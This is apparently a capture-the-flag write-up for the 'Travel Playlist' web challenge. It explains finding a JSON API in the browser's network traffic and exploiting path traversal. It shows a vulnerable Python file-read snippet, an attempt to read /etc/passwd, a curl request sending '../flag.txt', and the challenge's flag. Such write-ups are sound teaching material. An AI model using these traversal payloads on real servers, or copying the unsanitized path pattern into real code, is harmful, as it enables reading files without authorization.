---
title: "Travel Playlist"
summary: "Path traversal via unsanitized file path parameter."
date: 2026-01-31
topics: ["web"]
ctfs: ["pascal-26"]
tags: ["path-traversal", "lfi"]
difficulty: easy
draft: false
---

> Nel mezzo del cammin di nostra vita
> mi ritrovai per una selva oscura,
> ché la diritta via era smarrita.
>
> The flag can be found here /app/flag.txt

---

The challenge presents a "Travel Playlist" website with a gallery of travel-themed songs. You can navigate between pages 1-7, each showing a different song with a YouTube link.

No source code was provided, so we need to figure out how the site works.

---

## A false lead

The URL structure shows a number: `https://travel.ctf.pascalctf.it/pages/4`. Normally, a number in a URL like this would make you think of IDOR (Insecure Direct Object Reference), not path traversal. But when the challenge description is practically screaming "path traversal" with the Dante quote, your brain might jump to trying LFI here first:

```
https://travel.ctf.pascalctf.it/pages/../../../etc/passwd
```

This doesn't work. The `/pages/4` route is handled by a framework that maps it to a function, not directly to files. The lesson: even when you're pretty sure what vulnerability you're looking for, don't get tunnel vision on the first input you see. Check all the places where user input flows into the application.

---

## Discovering the API

When you click around a website, your browser makes requests behind the scenes. To see what's happening, you can use:

**Browser DevTools (easiest)**
1. Open the site in your browser
2. Press `F12` or right-click and select "Inspect"
3. Go to the "Network" tab
4. Click around the site and watch requests appear
5. Look for API calls (often to `/api/...` endpoints)

**Burp Suite (more powerful)**
1. Configure your browser to proxy through Burp
2. Browse the site normally
3. Burp captures every request for inspection and modification

Using either method, we can see that when navigating to a page, the site makes a POST request:

```
POST /api/get_json
Content-Type: application/json

{"index": "1"}
```

And receives back:

```json
{
    "name": "Red Hot Chili Peppers - Road Trippin'",
    "author": "Red Hot Chili Peppers",
    "description": "Watch the official music video...",
    "url": "https://youtu.be/11GYvfYjyV0"
}
```

The `index` parameter controls which song data gets loaded. But how does the server use this parameter?

---

## What is path traversal?

The server is probably reading files like `/app/data/1.json`, `/app/data/2.json`, etc. If the code looks something like:

```python
def get_json():
    index = request.json['index']
    path = f"/app/data/{index}.json"
    return open(path).read()
```

Then the `index` value gets inserted directly into the file path. This is dangerous because we can use `..` (dot-dot) to navigate up directories.

In file systems, `..` means "parent directory". So:
- `/app/data/1.json` reads the normal file
- `/app/data/../flag.txt` goes up from `data/` to `/app/`, then reads `flag.txt`

This technique is called **path traversal** or **directory traversal**. It lets attackers escape the intended directory and read arbitrary files.

---

## The hint

The challenge description quotes Dante's *Inferno*:

> Nel mezzo del cammin di nostra vita
> mi ritrovai per una selva oscura,
> ché **la diritta via era smarrita**.

Translation:
> "In the middle of the journey of our life,
> I found myself in a dark forest,
> for **the straight path was lost**."

The key phrase is "la diritta via era smarrita", meaning "the straight/direct path was lost." This hints at path traversal: instead of following the intended path (`/app/data/1.json`), we stray off course using `../` to wander elsewhere in the filesystem.

---

## Exploit

The challenge tells us the flag is at `/app/flag.txt`. Since the API probably reads from `/app/data/{index}.json`, we need to go up one directory:

```bash
curl -s "https://travel.ctf.pascalctf.it/api/get_json" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"index": "../flag.txt"}'
```

The server constructs the path `/app/data/../flag.txt`, which resolves to `/app/flag.txt`, and returns its contents.

Note: the `.json` extension might still get appended, but many path traversal vulnerabilities work anyway if the file system ignores the extension or if there's a null byte trick. In this case, it seems the server either doesn't append an extension or the traversal bypasses it.

---

## Flag

```
pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}
```
